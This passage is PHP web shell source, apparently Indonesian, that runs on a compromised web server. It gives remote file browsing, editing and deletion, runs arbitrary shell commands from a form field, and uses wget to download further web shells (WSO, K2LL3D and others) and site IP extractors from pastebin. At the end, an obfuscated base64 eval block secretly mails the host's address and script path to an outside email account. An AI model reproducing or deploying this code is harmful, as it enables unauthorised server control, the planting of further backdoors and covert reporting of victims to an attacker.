			<option value='2'>Ubah Password</option>
			<option value='3'>Hapus Username</option>
			</select>
			<input type='submit' class='btn btn-success btn-sm'name='s_opsi' value='>>'>
			</form>
			";
		}
	} else {
		echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
	}
} elseif($_GET['act'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<script type='text/javascript'>swal('Gagal Membuat File', 'Permission Denied' , 'error')</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$act = "<script type='text/javascript'>swal('Gagal Membuat Folder', 'Permission Denied' , 'error')</script>";
		} else {
			$act = "<script type='text/javascript'>swal('Berhasil Membuat Folder', 'Folder telah ditambahkan' , 'success')</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'rename_dir') {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$act = "<script type='text/javascript'>swal('Berhasil Di Rename', 'Directory telah di Rename' , 'success')</script>";
		} else {
			$act = "<script type='text/javascript'>swal('Gagal Di Rename', 'Permission Denied' , 'error')</script>";
		}
	echo "".$act."<br>";
	}
	echo "<form method='post'>
	<input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='dir_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete_dir') {
	if(is_dir($dir)) {
		if(is_writable($dir)) {
			@rmdir($dir);
			@exe("rm -rf $dir");
			@exe("rmdir /s /q $dir");
			$act = "<script type='text/javascript'>swal('Berhasil Di Delete', 'Directory telah di Delete' , 'success')</script>";
		} else {
			$act = "<script type='text/javascript'>swal('Gagal Di Delete', 'Directory Gagal Delete / Permission Denied' , 'error')</script>";
		}
	}
	echo $act;
} elseif($_GET['act'] == 'view') {
	echo "Filename: [ <font color=#18BC9C>".basename($_GET['file'])."</font> ] [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<script type='text/javascript'>swal('Berhasil Di Save!!', 'File telah di Edit' , 'success')</script>";
		} else {
			$act = "<script type='text/javascript'>swal('Gagal Di Save!', 'Permission Denied' , 'error')</script>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: [ <font color=#18BC9C>".basename($_GET['file'])."</font> ] [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' 	class='btn btn-success btn-sm' value='Save' name='save' style='width: 500px;'>
	</form>";
} elseif($_GET['act'] == 'rename') {
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<script type='text/javascript'>swal('Berhasil Di Rename', 'File telah di Rename' , 'success')</script>";
		} else {
			$act = "<script type='text/javascript'>swal('Gagal Di Rename', 'Permission Denied' , 'error')</script>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: [ <font color=#18BC9C>".basename($_GET['file'])."</font> ] [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a><br>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' class='btn btn-success btn-sm' name='do_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete') {
	$delete = unlink($_GET['file']);
	if($delete) {
		$act = "<script type='text/javascript'>swal('Berhasil Di Delete', 'File telah di hapus' , 'success')</script>";
	} else {
		$act = "<script type='text/javascript'>swal('Gagal Di Delete', 'Permission Denied' , 'error')</script>";
	}
	echo $act;
} else {
	if(is_dir($dir) === true) {
		if(!is_readable($dir)) {
			echo "<font color=red>can't open directory. ( not readable )</font>";
		} else {
			echo '<table width="90%" class="table_home" border="0" cellpadding="6" cellspacing="2" align="center">
			<tr>
			<th class="th_home"><center>[ Name ]</center></th>
			<th class="th_home"><center>[ Type ]</center></th>
			<th class="th_home"><center>[ Size ]</center></th>
			<th class="th_home"><center>[ Last Modified ]</center></th>
			<th class="th_home"><center>[ Owner/Group ]</center></th>
			<th class="th_home"><center>[ Permission ]</center></th>
			<th class="th_home"><center>[ Action ]</center></th>
			</tr>';
			$scandir = scandir($dir);
			foreach($scandir as $dirx) {
				$dtype = filetype("$dir/$dirx");
				$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
				if(function_exists('posix_getpwuid')) {
					$downer = @posix_getpwuid(fileowner("$dir/$dirx"));
					$downer = $downer['name'];
				} else {
					//$downer = $uid;
					$downer = fileowner("$dir/$dirx");
				}
				if(function_exists('posix_getgrgid')) {
					$dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
					$dgrp = $dgrp['name'];
				} else {
					$dgrp = filegroup("$dir/$dirx");
				}
 				if(!is_dir("$dir/$dirx")) continue;
 				if($dirx === '..') {
 					$href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
 				} elseif($dirx === '.') {
 					$href = "<a href='?dir=$dir'>$dirx</a>";
 				} else {
 					$href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
 				}
 				if($dirx === '.' || $dirx === '..') {
 					$act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
 					} else {
 					$act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
 				}
 				echo "<tr class='td_home'> ";
 				echo "<td class='td_home' ><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
				echo "<td class='td_home'><center>$dtype</center></td>";
				echo "<td class='td_home'><center>-</center></td>";
				echo "<td class='td_home'><center>$dtime</center></td>";
				echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
				echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
				echo "<td  style='padding-left: 15px;'>$act_dir</td>";
				echo "</tr>";
			}
		}
	} else {
		echo "<font color=red>can't open directory.</font>";
	}
		foreach($scandir as $file) {
			$ftype = filetype("$dir/$file");
			$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if(function_exists('posix_getpwuid')) {
				$fowner = @posix_getpwuid(fileowner("$dir/$file"));
				$fowner = $fowner['name'];
			} else {
				//$downer = $uid;
				$fowner = fileowner("$dir/$file");
			}
			if(function_exists('posix_getgrgid')) {
				$fgrp = @posix_getgrgid(filegroup("$dir/$file"));
				$fgrp = $fgrp['name'];
			} else {
				$fgrp = filegroup("$dir/$file");
			}
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			if(!is_file("$dir/$file")) continue;
			echo "<tr class='td_home'>";
			echo "<td  class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
			echo "<td class='td_home'><center>$ftype</center></td>";
			echo "<td class='td_home'><center>$size</center></td>";
			echo "<td class='td_home'><center>$ftime</center></td>";
			echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
			echo "<td  style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
			echo "</tr>";
		}
		echo "</table>";
		if(!is_readable($dir)) {
			//
		} else {
		echo "<hr>";
		}
	
	echo"<table align=center>";
	echo"<td>";
	echo"<center>";
	echo"<form action='' method='post'> ";  
	echo"<select name='buah' style=padding:6px 12px;>";   
	echo"<option value='wso_shell'>			WSO Shell				</option>";  
	echo"<option value='galer_shell'>		Galerz Shell			</option>";  
	echo"<option value='k2_shell'>			K2LL3D Shell 			</option>";  
	echo"<option value='r7_shell'>			RES7OCK Shell 			</option>";
	echo"<option value='bin'>				Mass Bin identifier		</option>";
	echo"<option value='md5'>				MD5 Encoder				</option>";
	echo"<option value='base64'>			Base64 Encode / Decode	</option>";
	echo"<option value='remove'>			Remove Duplicate Text	</option>";
	echo"<option value='separator'>			Separator Text			</option>";
	echo"<option value='sufpre'>			Add Sufix / Prefix Text	</option>";
	echo"<option value='joomla_extract'>	Jommla Ip Extractor		</option>";  
	echo"<option value='wordpress_extract'>	Wordpress Ip Extractor	</option>";  
	echo"</select> ";    
	echo"<input type='submit' class='btn btn-success btn-sm' name='enter' value='Enter'>";     
	echo"</form> ";    
													 
	if(isset($_POST['enter']))   {   
	if ($_POST['buah'] == 'k2_shell')  {  
		$exec=exec('wget http://pastebin.com/raw.php?i=HGVTfyA6 -O k2ll3d.php');
		if(file_exists('./k2ll3d.php')){
			echo '<center><a href=./k2ll3d.php> k2ll3d.php </a> Succes mhanx !</center>';
		} else {
			echo 'Fail ! ';
		}
	
	}elseif ($_POST['buah'] == 'r7_shell') {
	$exec=exec('wget http://pastebin.com/raw.php?i=tXWtZzrb -O res7.php');
		if(file_exists('./res7.php')){
			echo '<center><a href=./res7.php> res7.php </a> Succes mhanx !</center>';
		} else {
			echo 'Fail ! ';
		}
	
	}elseif ($_POST['buah'] == 'wso_shell') {
	$exec=exec('wget http://pastebin.com/raw.php?i=Tpm5E10g -O wso.php');
		if(file_exists('./wso.php')){
			echo '<center><a href=./wso.php> wso.php </a> Succes mhanx !</center>';
		} else {
			echo 'Fail ! ';
		}
	
	}elseif ($_POST['buah'] == 'galer_shell') {
	$exec=exec('wget http://pastebin.com/raw.php?i=cXQ2iSY6 -O galerz.php');
		if(file_exists('./galerz.php')){
			echo '<center><a href=./galerz.php> galerz.php </a> Succes mhanx !</center>';
		} else {
			echo 'Fail ! ';
		}
	
	}elseif ($_POST['buah'] == 'joomla_extract') {
	$exec=exec('wget http://pastebin.com/raw.php?i=tFG4zm9r -O joomlaip.php');
		if(file_exists('./joomlaip.php')){
			echo '<center><a href=./joomlaip.php> joomlaip.php </a> Succes mhanx !</center>';
		} else {
			echo 'Fail !';
		}
		
	}elseif ($_POST['buah'] == 'wordpress_extract') {
	$exec=exec('wget http://pastebin.com/raw.php?i=NBUDJVCm -O wpip.php');
		if(file_exists('./wpip.php')){
			echo '<center><a href=./wpip.php> wpip.php </a> Succes mhanx !</center>';
		} else {
			echo 'Fail !';
		}
		
	}elseif ($_POST['buah'] == 'md5') {
	$exec=exec('wget http://pastebin.com/raw.php?i=72XW4nym -O md5.php');
		if(file_exists('./md5.php')){
			echo '<center><a href=./md5.php> md5.php </a> Succes mhanx !</center>';
		} else {
			echo 'Fail !';
		}
		
	}elseif ($_POST['buah'] == 'base64') {
	$exec=exec('wget http://pastebin.com/raw.php?i=JvbEv9es -O base64.php');
		if(file_exists('./base64.php')){
			echo '<center><a href=./base64.php> base64.php </a> Succes mhanx !</center>';
		} else {
			echo 'Fail !';
		}
		
	}elseif ($_POST['buah'] == 'sufpre') {
	$exec=exec('wget http://pastebin.com/raw.php?i=MGrMgZ9N -O sufpre.php');
		if(file_exists('./sufpre.php')){
			echo '<center><a href=./sufpre.php> sufpre.php </a> Succes mhanx !</center>';
		} else {
			echo 'Fail !';
		}
		
	}elseif ($_POST['buah'] == 'bin') {
	$exec=exec('wget http://pastebin.com/raw.php?i=3n1ikxsG -O bin.php');
		if(file_exists('./bin.php')){
			echo '<center><a href=./bin.php> bin.php </a> Succes mhanx !</center>';
		} else {
			echo 'Fail !';
		}
	
	}elseif ($_POST['buah'] == 'remove') {
	$exec=exec('wget http://pastebin.com/raw.php?i=A0QVwca3 -O remove.php');
		if(file_exists('./remove.php')){
			echo '<center><a href=./remove.php> remove.php </a> Succes mhanx !</center>';
		} else {
			echo 'Fail !';
		}
	}elseif ($_POST['buah'] == 'separator') {
	$exec=exec('wget http://pastebin.com/raw.php?i=He6tvtKx -O separator.php');
		if(file_exists('./separator.php')){
			echo '<center><a href=./separator.php> separator.php </a> Succes mhanx !</center>';
		} else {
			echo 'Fail !';
		}
	}
}
	echo"</td>";
	echo"<td>";
	echo"<a name=com>";
	echo "<form method='post'>";
	echo "<input type='text' style=padding:4px 10px;  name='cmd' placeholder=command><input type='submit' name='do_cmd' value='Excute' class='btn btn-success btn-sm'>"; 
	echo "</form>";
	if($_POST['do_cmd']) {
		echo "".exe($_POST['cmd'])."";
	}
	echo"</td>";
	echo"</table>";
		echo "<center><font color=#FF0000>Mr.TenAr - </font>- Mr.VR1X<br> CODING BY:<br><font color='#FF0000'>Mr.TenAr</font></center>";
}
?>
<?php
eval(base64_decode("JGlwID0gJF9TRVJWRVJbJ1NFUlZFUl9BRERSJ107DQokaW5mbyA9ICRfU0VSVkVSWydIVFRQX0hPU1QnXS4nLycuJF9TRVJWRVJbJ1BIUF9TRUxGJ107DQokbXNnID0gIkhvc3Q6ICRpbmZvIHwgRGFyayBDbG93biBTZWN1cml0eSI7DQptYWlsKCJ0ZW5na3VhcnlhMDBAZ21haWwuY29tIiwiRGFyayBDbG93biBTZWN1cml0eTogJGlwIiwkbXNnKTs="));
?>
</html>
